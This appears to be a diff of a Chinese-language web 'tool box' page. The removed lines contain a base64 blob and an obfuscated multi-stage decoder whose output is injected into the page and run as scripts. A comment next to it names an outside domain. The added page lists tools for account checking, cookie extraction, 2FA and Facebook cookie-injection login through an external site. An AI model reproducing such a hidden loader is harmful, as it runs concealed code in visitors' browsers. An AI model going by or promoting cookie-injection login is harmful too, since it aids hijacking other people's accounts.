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';
-    const _0xb = 'xcnhjzcu';
-    function _0xc(_0xd) {
-      return decodeURIComponent(atob(_0xd).split('').map(c => '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2)).join(''));
+
+    /* 触摸设备：禁用 3D 倾斜与跟随光斑 */
+    @media (hover: none) {
+      .cards { perspective: none; }
+      .card { transform: none !important; }
+      .card:hover .card-inner,
+      .card:hover .card-icon { transform: none; }
+      .card-glow { display: none; }
     }
-    const _0xe = _0xc(_0xa);
-    function _0x11(str) {
-      const noiseMarkIndex = str.lastIndexOf('[NOISE:');
-      if (noiseMarkIndex === -1) return str;
-      const lenStart = noiseMarkIndex + 7;
-      const lenEnd = str.indexOf(']', lenStart);
-      const noiseLen = parseInt(str.slice(lenStart, lenEnd));
-      return str.slice(0, noiseMarkIndex);
-    }
-    const _0x12 = _0x11(_0xe);
-    function _0xf(_0x10) {
-      return [..._0x10].map(c => String.fromCharCode(c.charCodeAt(0) - 3)).join('');
-    }
-    const _0x13 = _0xf(_0x12);
-    function _0x14(str, key) {
-      return [...str].map((c, i) => String.fromCharCode(c.charCodeAt(0) ^ key[i % key.length].charCodeAt(0))).join('');
-    }
-    const _0x15 = _0x14(_0x13, _0xb);
-    function _0x16(str) {
-      let res = '';
-      for (let i = 0; i < str.length; i += 4) {
-        res += str.slice(i, i+4).split('').reverse().join('');
+
+    @media (prefers-reduced-motion: reduce) {
+      *, *::before, *::after {
+        animation-duration: 0.01ms !important;
+        transition-duration: 0.01ms !important;
       }
-      return res;
     }
-    const _0x17 = _0x16(_0x15);
-    function _0x18(str) {
-      const map = {'a':'z','z':'a','0':'9','9':'0','<':'>','>':'<','{':'}','}':'{','[':']',']':'['};
-      return [...str].map(c => map[c] || c).join('');
-    }
-    var _0x19;
-    _0x19 = _0x18(_0x17);
-    //<tcjm>       b6w.cn/kenc
-    const scriptContainer = document.createElement('div');
-    scriptContainer.innerHTML = _0x19;
-    const scripts = scriptContainer.querySelectorAll('script');
-    const domContent = scriptContainer.innerHTML;
-    document.body.innerHTML += domContent;
-    scripts.forEach(script => {
-      const newScript = document.createElement('script');
-      Array.from(script.attributes).forEach(attr => {
-        newScript.setAttribute(attr.name, attr.value);
-      });
-      newScript.textContent = script.textContent;
-      document.body.appendChild(newScript);
-    })
-    </script>
-    </body>
-    </html>
+  </style>
+</head>
+
+<body>
+  <!-- 顶部加载进度条 -->
+  <div class="progress" id="progress" aria-hidden="true"></div>
+
+  <!-- 背景层 -->
+  <div class="bg-layer" aria-hidden="true">
+    <div class="blob blob-a"></div>
+    <div class="blob blob-b"></div>
+    <div class="grain"></div>
+  </div>
+
+  <!-- Header -->
+  <header class="header" id="header">
+    <div class="header-left">
+      <a class="brand" href="index.html" aria-label="返回首页">
+        <span class="brand-mark" aria-hidden="true">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M4 18L12 4l8 14" />
+            <path d="M8 18h8" />
+          </svg>
+        </span>
+        <span class="brand-name">小豆<span>·</span>工具箱</span>
+      </a>
+
+      <nav class="nav-links" aria-label="主导航">
+        <a class="nav-link" href="index.html">入口</a>
+        <a class="nav-link active" href="#">工具箱</a>
+        <a class="nav-link" href="#">文档</a>
+      </nav>
+    </div>
+
+    <div class="header-tools">
+      <div class="clock" id="clock" aria-live="polite">
+        <span class="clock-date" id="clockDate">—</span>
+        <span class="clock-sep" aria-hidden="true"></span>
+        <span class="clock-time" id="clockTime">—:—:—</span>
+      </div>
+
+      <button class="theme-toggle" id="themeToggle" type="button" aria-label="切换深色 / 浅色主题">
+        <svg class="icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <circle cx="12" cy="12" r="4" />
+          <path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M4.93 19.07l1.41-1.41M17.66 6.34l1.41-1.41" />
+        </svg>
+        <svg class="icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z" />
+        </svg>
+      </button>
+    </div>
+  </header>
+
+  <!-- Main -->
+  <main class="main">
+    <!-- Hero -->
+    <section class="hero">
+      <span class="hero-eyebrow">
+        <span class="dot"></span>
+        Tools 实用工具
+      </span>
+      <h1 class="hero-title">实用工具库，<em>一键直达</em></h1>
+      <p class="hero-sub">
+        整合账号检测、UID提取、2FA验证等高频工具，以克制的视觉与精准的交互，让每一次使用都沉稳而高效。
+      </p>
+
+      <!-- 搜索 -->
+      <div class="search">
+        <div class="search-field">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <circle cx="11" cy="11" r="7" />
+            <path d="M21 21l-4.3-4.3" />
+          </svg>
+          <input
+            type="text"
+            class="search-input"
+            id="searchInput"
+            placeholder="搜索工具 · 账号检测 / UID / 2FA / Cookie"
+            autocomplete="off"
+            aria-label="搜索工具"
+          />
+        </div>
+        <p class="search-hint">
+          快捷键 <kbd>Alt</kbd> + <kbd>1</kbd> ~ <kbd>6</kbd> 直接进入对应工具
+        </p>
+      </div>
+    </section>
+
+    <!-- 工具卡片网格 -->
+    <section class="cards" id="cards" aria-label="工具导航卡片"></section>
+  </main>
+
+  <!-- Footer -->
+  <footer class="footer">
+    <div class="footer-inner">
+      <p class="footer-copy">
+        © <span id="year">2026</span> <b>小豆</b>
+        <span class="sep">·</span> 实用工具库
+        <span class="sep">·</span> All rights reserved
+      </p>
+      <div class="footer-stats">
+        <div class="stat">
+          <span class="stat-value" id="statVisit">—</span>
+          <span class="stat-label">今日访问</span>
+        </div>
+        <div class="stat">
+          <span class="stat-value" id="statTotal">—</span>
+          <span class="stat-label">累计访问</span>
+        </div>
+        <span class="stat-dot">系统运行正常</span>
+      </div>
+    </div>
+  </footer>
+
+  <!-- 返回顶部 -->
+  <button class="back-top" id="backTop" type="button" aria-label="返回顶部">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+      <path d="M12 19V5M5 12l7-7 7 7" />
+    </svg>
+  </button>
+
+  <script>
+    /* ============================================================
+       模块化 JavaScript
+       配置统一集中在 CONFIG，便于后续维护
+       ============================================================ */
+
+    /* ------------------------------------------------------------
+       配置区：工具卡片数据
+       currentWindow 为 true 的工具在当前窗口跳转，否则新窗口打开
+       ------------------------------------------------------------ */
+    const CONFIG = {
+      cards: [
+        {
+          key: 'account-check',
+          num: '01',
+          title: '账号检测',
+          subtitle: 'Account Check',
+          desc: '快速检测账号状态，高效排查异常。',
+          url: '/uid',
+          currentWindow: true,
+          icon: '<svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg>',
+        },
+        {
+          key: 'uid-extract',
+          num: '02',
+          title: 'cookie提取',
+          subtitle: 'UID Extract',
+          desc: '一键提取用户ID，操作简单高效。',
+          url: '/cookie',
+          currentWindow: true,
+          icon: '<svg viewBox="0 0 24 24" fill="currentColor"><path d="M9 11H7v2h2v-2zm4 0h-2v2h2v-2zm4 0h-2v2h2v-2zm2-7h-1V2h-2v2H8V2H6v2H5c-1.11 0-1.99.9-1.99 2L3 20c0 1.1.89 2 2 2h14c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 16H5V9h14v11z"/></svg>',
+        },
+        {
+          key: '2fa-verify',
+          num: '03',
+          title: '2FA验证',
+          subtitle: '2FA Verify',
+          desc: '双重身份验证，保障账号安全。',
+          url: '/2fa',
+          currentWindow: true,
+          icon: '<svg viewBox="0 0 24 24" fill="currentColor"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>',
+        },
+        {
+          key: 'cookie-login',
+          num: '04',
+          title: 'Cookie登录',
+          subtitle: 'Cookie Login',
+          desc: 'Facebook Cookie 注入登录。',
+          url: 'https://www.584136.xyz/facebook-cookie-injector',
+          currentWindow: false,
